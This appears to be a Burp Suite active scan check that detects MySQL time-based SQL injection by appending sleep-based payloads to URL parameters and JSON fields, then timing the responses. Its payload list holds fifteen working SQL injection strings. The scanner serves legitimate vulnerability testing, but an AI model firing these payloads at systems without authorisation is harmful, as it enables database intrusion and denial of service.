id: a7b2c4d6-e8f0-4a2b-9c1d-3e5f7a8b9c0d
name: MySQL Time-Based Active Scan (Per Request)
function: SCAN_CHECK_ACTIVE_PER_REQUEST
location: SCANNER
source: |
  /**
  * Detects time-based MySQL SQL injection - runs once per request.
  * Iterates through ALL URL parameters directly (like the Repeater version).
  * Handles both regular parameters and JSON-encoded parameters in GET requests.
  * Tests empty JSON fields as both strings and arrays.
  * Uses manual timing for accurate measurement in concurrent scans.
  * @author slicingmelon
  **/
  
  if (!requestResponse.hasResponse()) {
    return AuditResult.auditResult();
  }
  
  // Collect issues to return
  var issues = new java.util.ArrayList<AuditIssue>();
  
  // Configurable sleep time (in seconds)
  var DEFAULT_SLEEP_TIME = 15;
  var SLEEP_PLACEHOLDER = "§§§SLEEP_TIME§§§";
  
  var payloadTemplates = java.util.List.of(
    "'XOR(if(isnull(nullif(now(),sysdate())),sleep(§§§SLEEP_TIME§§§),0))XOR'Z",
    "'(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)'",
    "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
    "(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "-(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
    ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)",
    ",(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "'AND(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)AND'Z",
    " AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "' AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    ") AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "') AND (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z",
    "->test\"',(select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'",
    "->test\"' ASC, (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)) DESC-- z\"'",
    "->test\"') XOR (select(1)from(select(sleep(§§§SLEEP_TIME§§§)))a)-- z\"'"
  );
  
  // Build actual payloads by replacing placeholder with sleep time
  var payloads = payloadTemplates.stream()
    .map(p -> p.replace(SLEEP_PLACEHOLDER, String.valueOf(DEFAULT_SLEEP_TIME)))
    .toList();
  
  // Detection threshold based on sleep time (in milliseconds)
  var detectionThresholdMs = DEFAULT_SLEEP_TIME * 1000L;
  
  // Cache busting
  var bypassCache = true;
  var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
  
  // Custom URL encode - only encodes space, +, #, = (characters that break URL structure)
  var customUrlEncode = (java.util.function.Function<String, String>)(str -> {
    return str.replace(" ", "%20")
              .replace("+", "%2b")
              .replace("#", "%23")
              .replace("=", "%3D");
  });
  
  // Helper function to minify JSON (remove pretty-print formatting from toJsonString())
  var minifyJson = (java.util.function.Function<String, String>)(jsonStr -> {
    return jsonStr.replace("\n", "")
                  .replace("\r", "")
                  .replaceAll("\\{\\s+", "{")
                  .replaceAll("\\[\\s+", "[")
                  .replaceAll("\\s+\\}", "}")
                  .replaceAll("\\s+\\]", "]")
                  .replaceAll(",\\s+", ",")
                  .replaceAll(":\\s+", ":");
  });
  
  // Helper function to inject payload into a JSON string
  var injectIntoJson = (java.util.function.BiFunction<String, String, java.util.List<java.util.Map.Entry<String, String>>>)((jsonStr, payload) -> {
    var results = new java.util.ArrayList<java.util.Map.Entry<String, String>>();
    try {
      var jsonNode = JsonNode.jsonNode(jsonStr);
      var jsonObj = jsonNode.asObject();
      var jsonMap = jsonObj.asMap();
      
      for (var entry : jsonMap.entrySet()) {
        String targetKey = entry.getKey();
        var targetValueNode = entry.getValue();
        
        if (targetValueNode.isString() || targetValueNode.isNull()) {
          String originalValue = targetValueNode.isString() ? targetValueNode.asString() : "";
          boolean isEmpty = originalValue.isEmpty();
          
          // Test 1: Inject as string
          var newJsonObj = JsonObjectNode.jsonObjectNode();
          for (var e : jsonMap.entrySet()) {
            String k = e.getKey();
            var valueNode = e.getValue();
            
            if (k.equals(targetKey)) {
              String origVal = valueNode.isString() ? valueNode.asString() : "";
              newJsonObj.putString(k, origVal + payload);
            } else {
              if (valueNode.isString()) {
                newJsonObj.putString(k, valueNode.asString());
              } else if (valueNode.isNull()) {
                newJsonObj.put(k, JsonNullNode.jsonNullNode());
              } else {
                newJsonObj.put(k, valueNode);
              }
            }
          }
          String mutatedJsonStr = minifyJson.apply(newJsonObj.toJsonString());
          results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey, mutatedJsonStr));
          
          // Test 2: If field is empty, also try as array
          if (isEmpty) {
            var newJsonObjArray = JsonObjectNode.jsonObjectNode();
            for (var e : jsonMap.entrySet()) {
              String k = e.getKey();
              var valueNode = e.getValue();
              
              if (k.equals(targetKey)) {
                var payloadArray = JsonArrayNode.jsonArrayNode();
                payloadArray.addString(payload);
                newJsonObjArray.put(k, payloadArray);
              } else {
                if (valueNode.isString()) {
                  newJsonObjArray.putString(k, valueNode.asString());
                } else if (valueNode.isNull()) {
                  newJsonObjArray.put(k, JsonNullNode.jsonNullNode());
                } else {
                  newJsonObjArray.put(k, valueNode);
                }
              }
            }
            String mutatedJsonStrArray = minifyJson.apply(newJsonObjArray.toJsonString());
            results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey + "[]", mutatedJsonStrArray));
          }
          
        } else if (targetValueNode.isArray()) {
          var targetArray = targetValueNode.asArray();
          int arraySize = targetArray.asList().size();
          
          for (int i = 0; i < arraySize; i++) {
            var arrayElement = targetArray.get(i);
            
            if (arrayElement.isString() || arrayElement.isNull()) {
              var newJsonObj = JsonObjectNode.jsonObjectNode();
              
              for (var e : jsonMap.entrySet()) {
                String k = e.getKey();
                var valueNode = e.getValue();
                
                if (k.equals(targetKey)) {
                  var newArray = JsonArrayNode.jsonArrayNode();
                  for (int j = 0; j < arraySize; j++) {
                    var elem = targetArray.get(j);
                    if (j == i) {
                      String originalValue = elem.isString() ? elem.asString() : "";
                      newArray.addString(originalValue + payload);
                    } else {
                      if (elem.isString()) {
                        newArray.addString(elem.asString());
                      } else if (elem.isNull()) {
                        newArray.add(JsonNullNode.jsonNullNode());
                      } else {
                        newArray.add(elem);
                      }
                    }
                  }
                  newJsonObj.put(k, newArray);
                } else {
                  if (valueNode.isString()) {
                    newJsonObj.putString(k, valueNode.asString());
                  } else if (valueNode.isNull()) {
                    newJsonObj.put(k, JsonNullNode.jsonNullNode());
                  } else {
                    newJsonObj.put(k, valueNode);
                  }
                }
              }
              
              String mutatedJsonStr = minifyJson.apply(newJsonObj.toJsonString());
              results.add(new java.util.AbstractMap.SimpleEntry<>(targetKey + "[" + i + "]", mutatedJsonStr));
            }
          }
        }
      }
    } catch (Exception e) {
      // Silently skip invalid JSON
    }
    return results;
  });
  
  var baseRequest = requestResponse.request();
  if (baseRequest == null) return AuditResult.auditResult();
  
  // Get ALL URL parameters directly (like the Repeater version)
  var urlParameters = baseRequest.parameters().stream()
    .filter(p -> p.type() == HttpParameterType.URL)
    .toList();
  
  if (urlParameters.isEmpty()) {
    return AuditResult.auditResult();
  }
  
  // Iterate through each URL parameter
  for (var parameter : urlParameters) {
    String name = parameter.name();
    String value = parameter.value();
    
    // URL decode the value to check if it's JSON
    var decodedValue = api().utilities().urlUtils().decode(value);
    
    // Check if it's JSON
    if (decodedValue != null && !decodedValue.isEmpty() && 
        decodedValue.strip().startsWith("{") && decodedValue.strip().endsWith("}") &&
        api().utilities().jsonUtils().isValidJson(decodedValue)) {
      
      // Handle JSON parameter - inject into each JSON field
      for (String payload : payloads) {
        var jsonMutations = injectIntoJson.apply(decodedValue, payload);
        
        for (var jsonMutation : jsonMutations) {
          try {
            var jsonField = jsonMutation.getKey();
            var mutatedJson = jsonMutation.getValue();
            
            // URL-encode the mutated JSON for proper URL formatting (like Repeater version)
            var encodedMutatedJson = api().utilities().urlUtils().encode(mutatedJson);
            
            // Replace the parameter value in the raw request to preserve encoding
            var requestStr = new String(baseRequest.toByteArray().getBytes(), java.nio.charset.StandardCharsets.UTF_8);
            
            // Find the original encoded parameter value in the URL and replace with new encoded value
            var originalEncodedValue = api().utilities().urlUtils().encode(decodedValue);
            var searchPattern = name + "=" + originalEncodedValue;
            var replaceWith = name + "=" + encodedMutatedJson;
            
            var mutatedRequestStr = requestStr.replace(searchPattern, replaceWith);
            var mutatedRequest = HttpRequest.httpRequest(baseRequest.httpService(), mutatedRequestStr);
            
            // Add cache buster if enabled
            if (bypassCache) {
              var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
              mutatedRequest = mutatedRequest.withAddedParameters(
                HttpParameter.urlParameter("_czb", cacheBuster)
              );
            }
            
            // Manual timing for accurate measurement in concurrent scans
            long startTime = System.currentTimeMillis();
            var result = http.sendRequest(mutatedRequest);
            long endTime = System.currentTimeMillis();
            long elapsedMs = endTime - startTime;
            
            if (!result.hasResponse()) continue;
            
            if (elapsedMs >= detectionThresholdMs) {
              var detail = String.format("JSON param '%s' field '%s' with payload '%s' caused %dms delay", 
                name, jsonField, payload, elapsedMs);
              
              // Try to find payload for markers (optional - skip if not found)
              var markedResult = result;
              var reqBytes = mutatedRequest.toByteArray();
              var payloadBytes = ByteArray.byteArray(payload);
              var payloadIndex = reqBytes.indexOf(payloadBytes);
              if (payloadIndex >= 0) {
                markedResult = result.withRequestMarkers(
                  Marker.marker(Range.range(payloadIndex, payloadIndex + payload.length()))
                );
              } else {
                var urlEncodedPayload = api().utilities().urlUtils().encode(payload);
                var encodedBytes = ByteArray.byteArray(urlEncodedPayload);
                payloadIndex = reqBytes.indexOf(encodedBytes);
                if (payloadIndex >= 0) {
                  markedResult = result.withRequestMarkers(
                    Marker.marker(Range.range(payloadIndex, payloadIndex + urlEncodedPayload.length()))
                  );
                }
              }
              
              issues.add(AuditIssue.auditIssue(
                "MySQL Time-Based SQL Injection (JSON) - " + jsonField,
                detail,
                "Use parameterized queries to prevent SQL injection.",
                mutatedRequest.url(),
                AuditIssueSeverity.HIGH,
                AuditIssueConfidence.CERTAIN,
                "Time-based SQL injection allows attackers to extract data by observing response delays.",
                "",
                AuditIssueSeverity.HIGH,
                markedResult
              ));
            }
          } catch (Exception e) {
            // Continue with next payload on error
          }
        }
      }
    } else {
      // Handle regular parameter - inject directly
      for (String payload : payloads) {
        try {
          // Custom URL encode the payload (only space, +, #, =)
          var encodedPayload = customUrlEncode.apply(payload);
          
          // Create new parameter with payload appended
          var newParam = HttpParameter.urlParameter(name, value + encodedPayload);
          var mutatedRequest = baseRequest.withParameter(newParam);
          
          // Add cache buster if enabled
          if (bypassCache) {
            var cacheBuster = api().utilities().randomUtils().randomString(14, alphabet);
            mutatedRequest = mutatedRequest.withAddedParameters(
              HttpParameter.urlParameter("_czb", cacheBuster)
            );
          }
          
          // Manual timing for accurate measurement in concurrent scans
          long startTime = System.currentTimeMillis();
          var result = http.sendRequest(mutatedRequest);
          long endTime = System.currentTimeMillis();
          long elapsedMs = endTime - startTime;
          
          if (!result.hasResponse()) continue;
          
          if (elapsedMs >= detectionThresholdMs) {
            var detail = String.format("Param '%s' with payload '%s' caused %dms delay", 
              name, payload, elapsedMs);
            
            // Try to find payload for markers (optional - skip if not found)
            var markedResult = result;
            var reqBytes = mutatedRequest.toByteArray();
            var encodedBytes = ByteArray.byteArray(encodedPayload);
            var payloadIndex = reqBytes.indexOf(encodedBytes);
            if (payloadIndex >= 0) {
              markedResult = result.withRequestMarkers(
                Marker.marker(Range.range(payloadIndex, payloadIndex + encodedPayload.length()))
              );
            } else {
              var payloadBytes = ByteArray.byteArray(payload);
              payloadIndex = reqBytes.indexOf(payloadBytes);
              if (payloadIndex >= 0) {
                markedResult = result.withRequestMarkers(
                  Marker.marker(Range.range(payloadIndex, payloadIndex + payload.length()))
                );
              }
            }
            
            issues.add(AuditIssue.auditIssue(
              "MySQL Time-Based SQL Injection - " + name,
              detail,
              "Use parameterized queries to prevent SQL injection.",
              mutatedRequest.url(),
              AuditIssueSeverity.HIGH,
              AuditIssueConfidence.CERTAIN,
              "Time-based SQL injection allows attackers to extract data by observing response delays.",
              "",
              AuditIssueSeverity.HIGH,
              markedResult
            ));
          }
        } catch (Exception e) {
          // Continue with next payload on error
        }
      }
    }
  }
  
  // Return collected issues
  return AuditResult.auditResult(issues);
